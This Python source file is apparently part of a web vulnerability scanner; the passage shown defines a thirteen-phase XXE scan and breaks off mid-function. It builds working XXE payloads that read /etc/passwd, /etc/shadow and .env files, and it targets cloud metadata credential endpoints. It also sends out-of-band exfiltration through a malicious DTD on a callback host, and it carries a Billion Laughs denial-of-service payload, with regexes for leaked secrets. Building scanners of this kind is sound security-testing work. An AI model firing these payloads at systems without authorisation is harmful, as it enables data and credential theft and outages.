"""
XXE (XML External Entity) Injection scan mixin.

Attack categories covered (PortSwigger + HackTricks):

  Phase 1  — Classic file retrieval via external entity
             <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  Phase 2  — XXE to SSRF (internal HTTP requests via external entity)
  Phase 3  — Blind XXE via OOB / OAST (DNS + HTTP interactions, regular entity)
  Phase 4  — Blind XXE via XML parameter entities  (% syntax — bypasses entity blockers)
  Phase 5  — Blind OOB data exfiltration via malicious external DTD
  Phase 6  — Error-based XXE (parser error message contains file contents)
  Phase 7  — Local DTD repurposing (hybrid internal+external — no OOB needed)
  Phase 8  — XInclude attack (no DOCTYPE control — injected into a data value)
  Phase 9  — Content-Type conversion attack (JSON / form → text/xml)
  Phase 10 — SVG file upload XXE
  Phase 11 — SAML / SSO injection
  Phase 12 — Billion Laughs / entity-expansion DoS probe
  Phase 13 — SOAP endpoint discovery + XXE probe

Detection signals:
  • File content signatures (/etc/passwd lines, win.ini, boot.ini markers)
  • XML parser error strings that leak file contents (error-based)
  • OOB interaction confirmation recorded as INFO findings
  • Response length / status-code anomalies vs baseline
  • DoS indicators (timeout, memory error, entity expansion error)
"""

import re
import json
import time
import logging
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Target file lists
# ---------------------------------------------------------------------------
_LFI_UNIX = [
    "/etc/passwd",
    "/etc/hostname",
    "/etc/hosts",
    "/etc/shadow",
    "/etc/os-release",
    "/proc/self/environ",
    "/proc/version",
    "/var/www/html/index.php",
    "/var/www/html/.env",
]
_LFI_WIN = [
    "c:/windows/win.ini",
    "c:/boot.ini",
    "c:/windows/system32/drivers/etc/hosts",
    "c:/inetpub/wwwroot/web.config",
]
_LFI_ALL = _LFI_UNIX + _LFI_WIN

# Internal SSRF targets for Phase 2
_SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://127.0.0.1/",
    "http://127.0.0.1/admin",
    "http://localhost/",
    "http://[::1]/",
]

# Known local DTDs for Phase 7 repurposing (Arseniy Sharoglazov technique)
_LOCAL_DTDS: List[Tuple[str, str]] = [
    ("/usr/share/yelp/dtd/docbookx.dtd",                                      "ISOamso"),
    ("/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd",                    "ISOamso"),
    ("/usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd",                      "ISOamso"),
    ("/usr/share/sgml/docbook/sgml-dtd-4.1/docbook.dtd",                      "storage"),
    ("/usr/local/app/schema.dtd",                                              "custom_entity"),
    ("/etc/xml/docbook",                                                       "storage"),
    ("/opt/IBM/WebSphere/AppServer/properties/shibboleth/1.3/shibboleth.dtd", "entity1"),
]

# Common SOAP/XML-RPC paths for Phase 13
_SOAP_PATHS = [
    "/soap", "/soap/", "/wsdl", "/service", "/services",
    "/api/soap", "/api/service", "/ws", "/webservice",
    "/xmlrpc", "/xmlrpc.php",
]

# ---------------------------------------------------------------------------
# Detection signatures
# ---------------------------------------------------------------------------

# ── File content signatures ─────────────────────────────────────────────────
# Patterns that appear in ACTUAL FILE CONTENT reflected back in the response.
# Only match when the server echoed real file data — never network/parse errors.
_FILE_SIGS = [
    # /etc/passwd  — universal
    re.compile(r"root:x:0:0",                                      re.IGNORECASE),
    re.compile(r"root:\*:0:0",                                     re.IGNORECASE),
    re.compile(r"nobody:x:\d+:\d+",                                re.IGNORECASE),
    re.compile(r"www-data:x:\d+:\d+",                              re.IGNORECASE),
    re.compile(r"daemon:x:\d+:\d+",                                re.IGNORECASE),
    re.compile(r":/bin/(?:bash|sh|false|nologin)",                  re.IGNORECASE),
    re.compile(r":/usr/sbin/nologin",                              re.IGNORECASE),
    re.compile(r":/nonexistent:",                                  re.IGNORECASE),

    # /etc/hosts   — IP + hostname lines
    re.compile(r"127\.0\.0\.1\s+localhost",                        re.IGNORECASE),
    re.compile(r"::1\s+localhost",                                 re.IGNORECASE),
    re.compile(r"ip6-localhost\s+ip6-loopback",                    re.IGNORECASE),
    re.compile(r"ip6-allnodes",                                    re.IGNORECASE),
    re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+[a-zA-Z0-9_\-]+", re.IGNORECASE),

    # /etc/os-release
    re.compile(r'NAME="(?:Ubuntu|Debian|CentOS|Fedora|Red Hat|Alpine|Arch)',re.IGNORECASE),
    re.compile(r'VERSION_ID="\d+\.\d+',                            re.IGNORECASE),
    re.compile(r'ID_LIKE=(?:debian|rhel|fedora|arch)',             re.IGNORECASE),
    re.compile(r'PRETTY_NAME=',                                    re.IGNORECASE),

    # /etc/hostname  — too generic to match safely as a standalone regex.
    # A hostname like "e92548d3d643" is indistinguishable from any short token.
    # We detect /etc/hostname content indirectly: if it appears in an
    # "Invalid product ID: <hostname>" response, the length anomaly branch
    # will catch it. No dedicated signature here to avoid false positives.

    # Windows win.ini / boot.ini
    re.compile(r"\[fonts\]",                                       re.IGNORECASE),
    re.compile(r"\[extensions\]",                                  re.IGNORECASE),
    re.compile(r"for 16-bit app support",                          re.IGNORECASE),
    re.compile(r"\[boot loader\]",                                 re.IGNORECASE),
    re.compile(r"multi\(0\)disk",                                  re.IGNORECASE),

    # /proc/version / uname style
    re.compile(r"Linux version \d+\.\d+",                          re.IGNORECASE),
    re.compile(r"gcc version \d+\.\d+",                            re.IGNORECASE),
    re.compile(r"#\d+ SMP",                                        re.IGNORECASE),

    # web.config / app config
    re.compile(r"<configuration>",                                 re.IGNORECASE),
    re.compile(r"<connectionStrings",                              re.IGNORECASE),
    re.compile(r"<appSettings",                                    re.IGNORECASE),

    # /etc/shadow  (if accessible)
    re.compile(r"root:\$[0-9a-z$]+\$",                             re.IGNORECASE),

    # Cloud metadata
    re.compile(r"ami-id|AccessKeyId|security-credentials",         re.IGNORECASE),
    re.compile(r"computeMetadata|project-id",                      re.IGNORECASE),
    re.compile(r'"instanceId"\s*:',                                re.IGNORECASE),

    # Private keys
    re.compile(r"-----BEGIN (?:RSA |OPENSSH |EC )?PRIVATE KEY-----",re.IGNORECASE),
]

# ── File-access error signatures ─────────────────────────────────────────────
# These prove the parser ATTEMPTED to read the file/URL — confirmed XXE.
# FileNotFoundException for /etc/shadow = parser tried = real XXE.
# Split from network errors so Phase 1 vs Phase 2 can use different sets.
_FILE_ERROR_SIGS = [
    # Java file access errors — parser tried to open the file
    re.compile(r"java\.io\.FileNotFoundException",                  re.IGNORECASE),
    re.compile(r"java\.io\.IOException",                            re.IGNORECASE),
    re.compile(r"Permission denied",                                re.IGNORECASE),
    re.compile(r"No such file or directory",                        re.IGNORECASE),
    re.compile(r"Access is denied",                                 re.IGNORECASE),   # Windows
    re.compile(r"Invalid argument",                                 re.IGNORECASE),   # /proc/* on some kernels

    # SAX/XML character errors that confirm file was READ (binary content)
    re.compile(r"An invalid XML character.*Unicode",                re.IGNORECASE),
    re.compile(r"invalid byte sequence",                            re.IGNORECASE),
    re.compile(r"systemId: file:///",                               re.IGNORECASE),   # SAX path leak

    # Generic XML parsers (Python, .NET, libxml2)
    re.compile(r"xml\.etree|lxml\.etree",                           re.IGNORECASE),
    re.compile(r"XMLSyntaxError",                                   re.IGNORECASE),
    re.compile(r"expat|libxml2",                                    re.IGNORECASE),
    re.compile(r"org\.xml\.sax\.SAXParseException",                 re.IGNORECASE),
    re.compile(r"org\.xml\.sax",                                    re.IGNORECASE),
    re.compile(r"javax\.xml",                                       re.IGNORECASE),
    re.compile(r"com\.sun\.xml",                                    re.IGNORECASE),
]

# ── SSRF / network-error signatures ──────────────────────────────────────────
# These prove the server made an OUTBOUND network request — confirmed XXE+SSRF.
# ConnectException  = TCP connection attempt was made (real SSRF).
# UnknownHostException = DNS lookup was performed (real SSRF).
# Used ONLY for Phase 2 (SSRF) and Phase 13 (SOAP).
_SSRF_CONFIRM_SIGS = [
    re.compile(r"java\.net\.ConnectException",                      re.IGNORECASE),
    re.compile(r"java\.net\.UnknownHostException",                  re.IGNORECASE),
    re.compile(r"java\.net\.SocketException",                       re.IGNORECASE),
    re.compile(r"java\.net\.SocketTimeoutException",                re.IGNORECASE),
    re.compile(r"Connection refused",                               re.IGNORECASE),
    re.compile(r"Connection timed out",                             re.IGNORECASE),
    re.compile(r"Network is unreachable",                           re.IGNORECASE),
]

# ── Parser-blocked / entity-blocked signatures ───────────────────────────────
# Server parsed the DOCTYPE but actively BLOCKED entity loading.
# These confirm the XML parser SAW the entity but a security filter stopped it.
# Used for error-based (Phase 6) and local DTD (Phase 7) phases.
_BLOCKED_SIGS = [
    re.compile(r"external entity",                                  re.IGNORECASE),
    re.compile(r"loading external entity",                          re.IGNORECASE),
    re.compile(r"DTD .{0,30} not allowed",                          re.IGNORECASE),
    re.compile(r"DOCTYPE .{0,30} not allowed",                      re.IGNORECASE),
    re.compile(r"Entity .{0,30} not defined",                       re.IGNORECASE),
    re.compile(r"Entities are not allowed for security reasons",     re.IGNORECASE),
]

# ── DoS / entity expansion signatures ────────────────────────────────────────
_DOS_SIGS = [
    re.compile(r"out of memory|heap space",                         re.IGNORECASE),
    re.compile(r"timeout|timed.?out",                               re.IGNORECASE),
    re.compile(r"entity.{0,20}expansion|too many nested",           re.IGNORECASE),
    re.compile(r"stack overflow",                                    re.IGNORECASE),
    re.compile(r"JAXP\d+",                                          re.IGNORECASE),  # JAXP entity limit errors
]

# ── Per-phase signature sets ──────────────────────────────────────────────────
#
# Phase 1 (file retrieval): file content OR file-access errors.
#   NOT SSRF network errors — a Windows path on a Linux server returns
#   UnknownHostException("c") because "c:" looks like a hostname.
#   Matching that as Phase 1 evidence is misleading — it's a parser quirk,
#   not a file retrieval confirmation.
_P1_SIGS = _FILE_SIGS + _FILE_ERROR_SIGS

# Phase 2 (SSRF): network errors prove the server made an outbound request.
#   Also include file errors in case an internal service returns XML with file paths.
_P2_SIGS = _FILE_SIGS + _FILE_ERROR_SIGS + _SSRF_CONFIRM_SIGS

# Phase 4 (parameter entity): network errors prove %entity; was dereferenced.
#   Blocked-entity messages confirm the parser processed the DTD but killed the fetch.
#   Both are useful — either way, % entity syntax bypassed the regular-entity filter.
_P4_SIGS = _SSRF_CONFIRM_SIGS + _BLOCKED_SIGS

# Phase 6/7 (error-based, local DTD): any parser response including blocked responses.
#   "Entities are not allowed" = parser saw it but blocked it = interesting for error-based.
_P6_SIGS = _FILE_SIGS + _FILE_ERROR_SIGS + _BLOCKED_SIGS

# Phase 8 (XInclude): file content and file errors only.
#   XInclude errors that aren't file content are not evidence of success.
_P8_SIGS = _FILE_SIGS + _FILE_ERROR_SIGS

# Phase 12 (DoS): entity expansion / memory errors.
_P12_SIGS = _DOS_SIGS + _FILE_ERROR_SIGS

# Phase 13 (SOAP): network + file errors confirm the endpoint processed XML.
_P13_SIGS = _FILE_SIGS + _FILE_ERROR_SIGS + _SSRF_CONFIRM_SIGS

# Legacy combined list (kept for any callers that reference it directly)
_ERROR_SIGS = _FILE_ERROR_SIGS + _BLOCKED_SIGS + _SSRF_CONFIRM_SIGS
_ALL_CONFIRM_SIGS = _FILE_SIGS + _ERROR_SIGS

# ---------------------------------------------------------------------------
# Payload builders  (pure functions — no side effects)
# ---------------------------------------------------------------------------

def _strip_xml_prolog(body: str) -> str:
    """Strip <?xml ...?> declaration from body so it can be appended after
    a new prolog + DOCTYPE without producing duplicate declarations."""
    import re as _re
    return _re.sub(r'^\s*<\?xml[^?]*\?>\s*', '', (body or "").strip(), flags=_re.IGNORECASE)


def _p_classic(entity_val: str, tag: str = "productId") -> str:
    """
    LEGACY FALLBACK ONLY — used when no original body is available.
    For real XML bodies use _inject_entity_into_body() instead.
    """
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{val}"> ]>\n'
        '<stockCheck><{tag}>&xxe;</{tag}></stockCheck>'
    ).format(val=entity_val, tag=tag)


def _inject_entity_into_body(original_body: str, entity_val: str,
                              inject_tag: str) -> str:
    """
    Build a correct XXE payload by:
      1. Stripping the <?xml ...?> declaration from the original body
      2. Prepending a fresh declaration + DOCTYPE that defines &xxe;
      3. Replacing the TEXT CONTENT of the *first* occurrence of <inject_tag>
         with &xxe;  — all other tags/values are left intact

    Example:
      original_body = '<?xml version="1.0"?>
                       <stockCheck><productId>1</productId>
                       <storeId>1</storeId></stockCheck>'
      inject_tag    = "productId"
      entity_val    = "file:///etc/passwd"

    Result:
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
    """
    # Strip existing <?xml ...?> declaration (we'll prepend our own)
    body_no_decl = re.sub(r'<\?xml[^?]*\?>\s*', '', original_body, count=1)

    # Replace the text content of the first matching tag with &xxe;
    # Matches:  <tagName>...text...</tagName>
    # Does NOT match nested elements (only plain text nodes)
    pattern = r'(<{t}>)[^<]*(</{t}>)'.format(t=re.escape(inject_tag))
    injected, n = re.subn(pattern, r'\g<1>&xxe;\g<2>', body_no_decl, count=1)

    if n == 0:
        # Tag not found or had nested children — fall back to appending
        # the entity reference as a new child of the root element
        root_close = re.search(r'(</[A-Za-z][A-Za-z0-9_:-]*>\s*)$', body_no_decl)
        if root_close:
            injected = (
                body_no_decl[:root_close.start()]
                + f'<{inject_tag}>&xxe;</{inject_tag}>'
                + root_close.group(0)
            )
        else:
            injected = body_no_decl + f'<{inject_tag}>&xxe;</{inject_tag}>'

    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "{val}"> ]>\n'
        '{body}'
    ).format(val=entity_val, body=injected)


def _p_param_entity(oast: str, body: str = "") -> str:
    """Phase 4: XML parameter entity OOB ping.
    Optionally appends the original document body so schema-validating parsers
    don't reject the request before processing the DOCTYPE."""
    doc_body = _strip_xml_prolog(body)
    suffix = "\n" + doc_body if doc_body else ""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{oast}"> %xxe; ]>{suffix}'
    ).format(oast=oast, suffix=suffix)


def _p_param_entity_no_oast(body: str = "") -> str:
    """Phase 4a: parameter entity pointing at a unique bogus hostname.
    No OAST required — if the XML parser processes %xxe; it tries to resolve
    the hostname and the resulting UnknownHostException / ConnectException leaks
    into the response, confirming that % parameter entities are NOT filtered.
    Optionally appends the original document body for schema-validating parsers."""
    import random, string
    rand = "".join(random.choices(string.ascii_lowercase, k=8))
    bogus = f"http://{rand}.xxe-detect.invalid/"
    doc_body = _strip_xml_prolog(body)
    suffix = "\n" + doc_body if doc_body else ""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{bogus}"> %xxe; ]>{suffix}'
    ).format(bogus=bogus, suffix=suffix)


def _p_oob_exfil(oast: str, body: str = "") -> str:
    """Phase 5: loads malicious DTD from attacker server to exfiltrate data.
    Optionally appends the original document body for schema-validating parsers."""
    doc_body = _strip_xml_prolog(body)
    suffix = "\n" + doc_body if doc_body else ""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM\n'
        '  "http://{oast}/malicious.dtd"> %xxe;]>{suffix}'
    ).format(oast=oast, suffix=suffix)


def _p_error_based(fpath: str) -> str:
    """Phase 6: trigger parser error whose message contains file contents."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % file SYSTEM "file://{f}">\n'
        '  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/&#x25;file;\'>">\n'
        '  %eval;\n'
        '  %error;\n'
        ']>\n'
        '<foo/>'
    ).format(f=fpath)


def _p_local_dtd(dtd_path: str, entity_name: str, fpath: str) -> str:
    """Phase 7: hybrid internal+external DTD repurposing."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [\n'
        '  <!ENTITY % local_dtd SYSTEM "file://{dtd}">\n'
        '  <!ENTITY % {ent} \'\n'
        '    <!ENTITY &#x25; file SYSTEM "file://{f}">\n'
        '    <!ENTITY &#x25; eval\n'
        '      "<!ENTITY &#x26;#x25; error SYSTEM\n'
        '        &#x27;file:///nonexistent/&#x25;file;&#x27;>">\n'
        '    &#x25;eval;\n'
        '    &#x25;error;\n'
        '  \'>\n'
        '  %local_dtd;\n'
        ']>\n'
        '<foo/>'
    ).format(dtd=dtd_path, ent=entity_name, f=fpath)


def _p_xinclude(fpath: str) -> str:
    """
    Phase 8: XInclude standalone body (used when we have no structure to preserve).
    The xi namespace goes on the wrapper element.
    """
    return (
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file://{f}"/></foo>'
    ).format(f=fpath)


def _p_xinclude_in_tag(original_body: str, inject_tag: str, fpath: str) -> str:
    """
    Build a correct XInclude payload by injecting <xi:include> directly as a
    child of the target tag, with the xi namespace declared on THAT tag.

    This preserves the full original document structure so the server can still
    route the request and echo the injected content back.

    Example:
      original: <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
      inject_tag: productId
      fpath: /etc/passwd

    Result:
      <?xml version="1.0" encoding="UTF-8"?>
      <stockCheck>
        <productId xmlns:xi="http://www.w3.org/2001/XInclude">
          <xi:include parse="text" href="file:///etc/passwd"/>
        </productId>
        <storeId>1</storeId>
      </stockCheck>
    """
    XI_NS = 'xmlns:xi="http://www.w3.org/2001/XInclude"'
    xi_element = f'<xi:include parse="text" href="file://{fpath}"/>'

    # Strip existing declaration
    body_no_decl = re.sub(r'<\?xml[^?]*\?>\s*', '', original_body, count=1)

    # Replace <tag>text</tag>  →  <tag xmlns:xi="..."><xi:include .../></tag>
    # Also handles <tag/> (self-closing) by converting to open+close
    pattern = r'<({t})(\s[^>]*)?>(?:[^<]*)</\1>'.format(t=re.escape(inject_tag))
    replacement = f'<{inject_tag} {XI_NS}>{xi_element}</{inject_tag}>'
    injected, n = re.subn(pattern, replacement, body_no_decl, count=1)

    if n == 0:
        # Tag not found — can't inject
        return ""

    return f'<?xml version="1.0" encoding="UTF-8"?>\n{injected}'


def _p_xinclude_in_form_param(form_body: str, param_name: str, fpath: str) -> str:
    """
    Phase 8 / Strategy C: inject xi:include into a form-urlencoded parameter value.

    The original request is application/x-www-form-urlencoded.  We must NOT change
    the Content-Type — the server routes and parses the request based on it.
    Instead we URL-encode the xi:include element and substitute it for the target
    parameter value, keeping every other parameter intact.

    Example:
      form_body:   productId=1&storeId=1
      param_name:  productId
      fpath:       /etc/passwd

    Produces:
      productId=<foo+xmlns%3Axi%3D...><xi%3Ainclude+parse%3D"text"+href%3D"file%3A%2F%2F%2Fetc%2Fpasswd"%2F><%2Ffoo>&storeId=1

    This keeps Content-Type: application/x-www-form-urlencoded so the server
    actually receives and processes the request, then injects into the value
    that the back-end XML parser will consume (e.g. productId fed into an
    XML document the server builds internally).
    """
    xi_raw = (
        f'<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include parse="text" href="file://{fpath}"/></foo>'
    )
    xi_encoded = urllib.parse.quote(xi_raw, safe="")

    params = urllib.parse.parse_qsl(form_body, keep_blank_values=True)
    rebuilt = []
    for k, v in params:
        if k == param_name:
            rebuilt.append(f"{urllib.parse.quote(k, safe='')}={xi_encoded}")
        else:
            rebuilt.append(
                f"{urllib.parse.quote(k, safe='')}={urllib.parse.quote(v, safe='')}"
            )
    return "&".join(rebuilt)


def _p_svg(fpath: str) -> str:
    """Phase 10: malicious SVG with XXE entity."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://{f}"> ]>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="128" height="128">\n'
        '  <text y="20">&xxe;</text>\n'
        '</svg>'
    ).format(f=fpath)


def _p_billion_laughs() -> str:
    """Phase 12: Billion Laughs entity expansion DoS."""
    return (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE lolz [\n'
        ' <!ENTITY lol "lol">\n'
        ' <!ELEMENT lolz (#PCDATA)>\n'
        ' <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
        ' <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n'
        ' <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
        ' <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">\n'
        ' <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">\n'
        ' <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">\n'
        ' <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">\n'
        ' <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">\n'
        ' <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">\n'
        ']>\n'
        '<lolz>&lol9;</lolz>'
    )


def _p_saml(fpath: str) -> str:
    """Phase 11: SAML AuthnRequest with XXE entity in Issuer."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE samlp:AuthnRequest [\n'
        '  <!ENTITY xxe SYSTEM "file://{f}">\n'
        ']>\n'
        '<samlp:AuthnRequest\n'
        '    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"\n'
        '    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"\n'
        '    ID="_xxe_test" Version="2.0"\n'
        '    IssueInstant="2024-01-01T00:00:00Z">\n'
        '  <saml:Issuer>&xxe;</saml:Issuer>\n'
        '</samlp:AuthnRequest>'
    ).format(f=fpath)


def _body_to_xml(body: str, ct: str) -> Optional[str]:
    """
    Phase 9 helper: convert JSON or form-urlencoded body to minimal XML.
    Returns None if the body cannot be converted.
    """
    ct_l = (ct or "").lower()
    try:
        if "application/json" in ct_l:
            data = json.loads(body)
            if not isinstance(data, dict):
                return None
            inner = "".join(
                "<{k}>{v}</{k}>".format(
                    k=k,
                    v=str(v).replace("&", "&amp;").replace("<", "&lt;")
                )
                for k, v in data.items()
            )
            return '<?xml version="1.0" encoding="UTF-8"?><root>{}</root>'.format(inner)

        elif "application/x-www-form-urlencoded" in ct_l:
            params = urllib.parse.parse_qs(body, keep_blank_values=True)
            inner = "".join(
                "<{k}>{v}</{k}>".format(
                    k=k,
                    v=(str(v[0]).replace("&", "&amp;").replace("<", "&lt;") if v else "")
                )
                for k, v in params.items()
            )
            return '<?xml version="1.0" encoding="UTF-8"?><root>{}</root>'.format(inner)
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# XxeScanMixin
# ---------------------------------------------------------------------------

class XxeScanMixin:
    """
    Mixin providing the full XXE vulnerability scan (13 phases).

    Requires the hosting class (ScanWorker) to expose:
        send_request_with_traffic(url, headers, method, body, payload,
                                  payload_type)  -> response
        scan_progress   : pyqtSignal(str)
        request_data    : dict
        running         : bool
        boost_mode      : bool
        oast_url        : str | None
        scan_stop_on_first : bool
        scan_timeout    : int
        _is_forced_point(prefix, name) -> bool
    """

    # =========================================================================
    # PUBLIC ENTRY POINT
    # =========================================================================

    def scan_xxe(self) -> Dict[str, Any]:
        """Run the full 13-phase XXE scan. Returns standard results dict."""
        self.scan_progress.emit("🔎 Starting XXE (XML External Entity) scan...")
        self.scan_progress.emit("=" * 60)

        results: Dict[str, Any] = {
            "scan_type":  "XXE",
            "vulnerable": False,
            "details":    [],
            "summary":    "",
            "stats": {
                "payloads_tested": 0,
                "phases_run":      [],
                "vulnerabilities": 0,
            },
        }

        try:
            url, method, headers, body, ct = self._xxe_parse_request()
            if not url:
                results["summary"] = "No URL provided."
                return results

            baseline = self._xxe_baseline(url, method, headers, body)
            if not baseline:
                results["summary"] = "Could not establish baseline — scan aborted."
                return results

            self.scan_progress.emit(
                f"\n📈 Baseline  status={baseline['status']}  "
                f"len={baseline['length']}b  time={baseline['time']}s  "
                f"text={repr(baseline.get('text', '')[:40])}"
            )

            is_xml   = self._xxe_is_xml(body, ct)
            is_json  = "application/json" in ct.lower()
            is_form  = "application/x-www-form-urlencoded" in ct.lower()
            has_file = self._xxe_has_upload(body, headers)
            oast     = getattr(self, "oast_url", None) or ""

            self.scan_progress.emit(
                f"📋 Request: XML={is_xml}  JSON={is_json}  "
                f"Form={is_form}  FileUpload={has_file}  "
                f"CT={ct or '(none)'}"
            )

            # Shared kwargs passed to all phase methods
            ctx = dict(url=url, method=method, headers=headers,
                       body=body, ct=ct, baseline=baseline, results=results)


            stop_on_first = getattr(self, "scan_stop_on_first", False)

            def _should_run(xml_required: bool = False) -> bool:
                """Return True if the phase should execute.
                Gated on: scan still running, XML requirement met,
                and (if stop_on_first) no confirmed finding yet."""
                if not self.running:
                    return False
                if xml_required and not is_xml:
                    return False
                if stop_on_first and results["vulnerable"]:
                    return False
                return True

            # ── Run phases ──────────────────────────────────────────────────
            if _should_run(xml_required=True):
                self._xxe_p1_classic(**ctx)

            if _should_run(xml_required=True):
                self._xxe_p2_ssrf(**ctx)

            if _should_run(xml_required=True):
                if oast:
                    self._xxe_p3_blind_oob(oast=oast, **ctx)
                else:
                    self.scan_progress.emit(
                        "\n⏭️  Phase 3  Blind OOB skipped — no OAST URL configured"
                    )

            if _should_run(xml_required=True):
                # Phase 4 always runs: 4a (no-OAST bogus-host detection) fires
                # regardless; 4b (OOB callback) fires only when oast is set.
                self._xxe_p4_param_entity(oast=oast, **ctx)

            if _should_run(xml_required=True):
                if oast:
                    self._xxe_p5_oob_exfil(oast=oast, **ctx)
                else:
                    self.scan_progress.emit(
                        "\n⏭️  Phase 5  OOB exfil skipped — no OAST URL"
                    )

            if _should_run(xml_required=True):
                self._xxe_p6_error_based(**ctx)

            if _should_run(xml_required=True):
                self._xxe_p7_local_dtd(**ctx)

            if _should_run():
                self._xxe_p8_xinclude(**ctx, is_form=is_form)

            if _should_run() and (is_json or is_form):
                self._xxe_p9_ct_conversion(**ctx)

            if _should_run() and has_file:
                self._xxe_p10_svg_upload(**ctx)

            if _should_run():
                self._xxe_p11_saml(**ctx)

            if _should_run(xml_required=True):
                self._xxe_p12_billion_laughs(**ctx)

            if _should_run():
                self._xxe_p13_soap(url=url, method=method,
                                   headers=headers, baseline=baseline,
                                   results=results)

        except Exception as exc:
            logger.error("XXE scan error: %s", exc, exc_info=True)
            results["error"] = str(exc)

        n = results["stats"]["vulnerabilities"]
        if results["vulnerable"]:
            phases = ", ".join(dict.fromkeys(results["stats"]["phases_run"]))
            results["summary"] = (
                f"XXE vulnerability confirmed! {n} finding(s)  "
                f"[phases: {phases}]"
            )
        else:
            tested = results["stats"]["payloads_tested"]
            oob    = sum(1 for d in results["details"] if d.get("confidence") == "INFO")
            results["summary"] = (
                f"No in-band XXE confirmed.  "
                f"{tested} payloads tested."
                + (f"  {oob} OOB probe(s) sent — check interactsh." if oob else "")
            )

        return results

    # =========================================================================
    # PHASES
    # =========================================================================

    def _xxe_p1_classic(self, url, method, headers, body, ct, baseline, results):
        self.scan_progress.emit(
            "\n📄 Phase 1 — Classic File Retrieval via External Entity"
        )
        leaf_tags = self._xxe_xml_tags(body)
        self.scan_progress.emit(
            f"  Injection points detected: {leaf_tags}"
        )
        stop_on_first = getattr(self, "scan_stop_on_first", False)
        # Track which tags already have a confirmed HIGH finding so we don't
        # keep hammering the same injection point with every file in _LFI_ALL.
        # A tag is "confirmed" once any file returns a HIGH-confidence hit.
        confirmed_tags: set = set()

        for fpath in _LFI_ALL:
            if not self.running:
                break
            for tag in leaf_tags:
                if not self.running:
                    break
                # Skip tags already confirmed — no new information to gain
                if tag in confirmed_tags:
                    continue
                payload = _inject_entity_into_body(body, f"file://{fpath}", tag)
                hit = self._xxe_fire(
                    url, method, headers, payload,
                    ct, baseline, results,
                    phase="classic_file_retrieval",
                    note=f"file://{fpath} injected into <{tag}>",
                    # File content + file-access errors only.
                    # NOT SSRF network errors: Windows paths like file://c:/...
                    # trigger UnknownHostException("c") because the Java parser
                    # treats "c:" as a hostname — that's a parser quirk, not
                    # a file retrieval confirmation.
                    sigs=_P1_SIGS,
                )
                if hit and hit.get("confidence") == "HIGH":
                    confirmed_tags.add(tag)
                    if stop_on_first:
                        # Stop entire phase on first confirmed finding
                        results["stats"]["phases_run"].append("classic_file_retrieval")
                        return
            # If ALL tags are confirmed, no point continuing with more files
            if confirmed_tags and len(confirmed_tags) >= len(leaf_tags):
                self.scan_progress.emit(
                    f"  ✅ All {len(leaf_tags)} injection point(s) confirmed — stopping Phase 1 early"
                )
                break
        results["stats"]["phases_run"].append("classic_file_retrieval")

    def _xxe_p2_ssrf(self, url, method, headers, body, ct, baseline, results):
        self.scan_progress.emit("\n🌐 Phase 2 — XXE to SSRF")
        leaf_tags     = self._xxe_xml_tags(body)
        stop_on_first = getattr(self, "scan_stop_on_first", False)

        # Deduplicate SSRF findings per target URL.
        # SSRF is a server-side behaviour: the server either makes the outbound
